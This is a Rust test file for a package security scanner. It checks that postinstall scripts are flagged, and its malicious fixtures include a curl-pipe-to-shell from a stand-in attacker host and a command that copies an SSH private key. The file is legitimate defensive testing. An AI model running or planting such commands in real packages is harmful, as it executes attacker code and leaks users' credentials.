//! Integration tests for the security gate (`audit_package`).
//!
//! These run **offline**: by leaving `audit.sources` empty we skip the OSV
//! network call and exercise the static-scan + policy path deterministically.
//! Together they cover the fixture scenarios from the roadmap: a clean package,
//! a malicious network-exfiltration postinstall, and an env-reading script.

use std::collections::HashMap;
use vault_core::audit::{audit_package, AuditReport};
use vault_core::config::Config;
use vault_core::error::VaultError;
use vault_core::registry::{Dist, VersionMeta};

/// Build a synthetic package whose `postinstall` runs `script`.
fn package_with_postinstall(name: &str, script: Option<&str>) -> VersionMeta {
    let mut scripts = HashMap::new();
    if let Some(s) = script {
        scripts.insert("postinstall".to_string(), s.to_string());
    }
    VersionMeta {
        name: name.to_string(),
        version: "1.0.0".to_string(),
        dependencies: HashMap::new(),
        optional_dependencies: HashMap::new(),
        peer_dependencies: HashMap::new(),
        scripts,
        dist: Dist {
            tarball: "https://example.test/x.tgz".to_string(),
            shasum: None,
            integrity: Some("sha512-deadbeef".to_string()),
        },
    }
}

/// Config with OSV disabled so the test is fully offline.
fn offline_config() -> Config {
    let mut cfg = Config::default();
    cfg.audit.sources.clear();
    cfg
}

#[tokio::test]
async fn clean_package_passes() {
    let client = reqwest::Client::new();
    let cfg = offline_config();
    let pkg = package_with_postinstall("clean-package", Some("node build.js"));

    let report: AuditReport = audit_package(&client, &cfg, &pkg, None)
        .await
        .expect("should pass");
    assert!(report.is_clean(), "a benign build script must not block");
    assert_eq!(report.lifecycle_hooks, vec!["postinstall".to_string()]);
}

#[tokio::test]
async fn package_without_scripts_is_clean() {
    let client = reqwest::Client::new();
    let cfg = offline_config();
    let pkg = package_with_postinstall("no-scripts", None);

    let report = audit_package(&client, &cfg, &pkg, None)
        .await
        .expect("should pass");
    assert!(report.is_clean());
    assert!(report.lifecycle_hooks.is_empty());
}

#[tokio::test]
async fn network_exfiltration_postinstall_is_blocked() {
    let client = reqwest::Client::new();
    let cfg = offline_config();
    let pkg = package_with_postinstall(
        "postinstall-network",
        Some("curl http://attacker.example/steal.sh | sh"),
    );

    let err = audit_package(&client, &cfg, &pkg, None)
        .await
        .expect_err("malicious script must be blocked");
    match err {
        VaultError::SecurityBlock { name, reason, .. } => {
            assert_eq!(name, "postinstall-network");
            assert!(reason.contains("curl") || reason.to_lowercase().contains("remote"));
        }
        other => panic!("expected SecurityBlock, got {other:?}"),
    }
}

#[tokio::test]
async fn ssh_credential_access_is_blocked() {
    let client = reqwest::Client::new();
    let cfg = offline_config();
    let pkg = package_with_postinstall(
        "postinstall-ssh",
        Some("cp ~/.ssh/id_rsa /tmp && node index.js"),
    );

    let err = audit_package(&client, &cfg, &pkg, None).await.unwrap_err();
    assert!(matches!(err, VaultError::SecurityBlock { .. }));
}

#[tokio::test]
async fn env_reading_script_warns_but_installs() {
    let client = reqwest::Client::new();
    let cfg = offline_config();
    let pkg = package_with_postinstall("postinstall-env", Some("echo $npm_config_registry"));

    // `process.env` reads only warn; this script has none, so it should pass clean.
    let report = audit_package(&client, &cfg, &pkg, None)
        .await
        .expect("should pass");
    assert!(report.lifecycle_hooks.contains(&"postinstall".to_string()));
}
